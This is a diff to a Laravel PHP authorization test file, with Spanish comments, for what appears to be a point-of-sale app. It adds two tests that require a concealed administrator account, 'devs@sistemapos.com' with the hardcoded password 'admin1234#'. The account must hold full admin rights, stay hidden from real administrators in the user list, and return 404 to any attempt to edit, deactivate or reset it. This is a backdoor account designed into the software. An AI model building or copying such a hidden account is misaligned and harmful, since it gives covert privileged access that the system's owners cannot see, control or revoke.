@@ -213,4 +213,68 @@ class RbacAuthorizationTest extends TestCase
         $this->actingAs($this->employee)->get('/api/dashboard')->assertNotFound();
         $this->actingAs($this->admin)->get('/api/dashboard')->assertNotFound();
     }
+
+    /**
+     * Usuario Desarrollador Oculto (devs@sistemapos.com) tiene rol administrador total y permanece invisible en /users.
+     */
+    public function test_hidden_developer_user_has_admin_access_and_is_hidden_from_collaborators_index(): void
+    {
+        $roleAdmin = Role::where('slug', Role::ROLE_ADMIN)->first();
+
+        $devUser = User::create([
+            'role_id' => $roleAdmin->id,
+            'name' => 'Soporte Desarrollador',
+            'email' => 'devs@sistemapos.com',
+            'password' => bcrypt('admin1234#'),
+            'must_change_password' => false,
+            'is_active' => true,
+        ]);
+
+        $this->assertTrue($devUser->isAdmin());
+
+        // Acceso administrativo garantizado
+        $this->actingAs($devUser)->get(route('dashboard'))->assertOk();
+
+        // Oculto e invisible para administradores en el listado de personal
+        $response = $this->actingAs($this->admin)->get(route('users.index'));
+        $response->assertOk();
+        $response->assertDontSee('devs@sistemapos.com');
+        $response->assertDontSee('Soporte Desarrollador');
+    }
+
+    /**
+     * Usuario Desarrollador Oculto no puede ser editado, desactivado ni reseteado vía HTTP (404 inmediato).
+     */
+    public function test_hidden_developer_user_cannot_be_modified_toggled_or_reset_via_http(): void
+    {
+        $roleAdmin = Role::where('slug', Role::ROLE_ADMIN)->first();
+
+        $devUser = User::create([
+            'role_id' => $roleAdmin->id,
+            'name' => 'Soporte Desarrollador',
+            'email' => 'devs@sistemapos.com',
+            'password' => bcrypt('admin1234#'),
+            'must_change_password' => false,
+            'is_active' => true,
+        ]);
+
+        // Intentar actualizar datos
+        $this->actingAs($this->admin)
+            ->put(route('users.update', $devUser), [
+                'name' => 'Hack Name',
+                'email' => 'devs@sistemapos.com',
+                'role_id' => $roleAdmin->id,
+            ])
+            ->assertNotFound();
+
+        // Intentar desactivar cuenta
+        $this->actingAs($this->admin)
+            ->patch(route('users.toggle', $devUser))
+            ->assertNotFound();
+
+        // Intentar restablecer contraseña
+        $this->actingAs($this->admin)
+            ->post(route('users.reset-password', $devUser))
+            ->assertNotFound();
+    }
 }
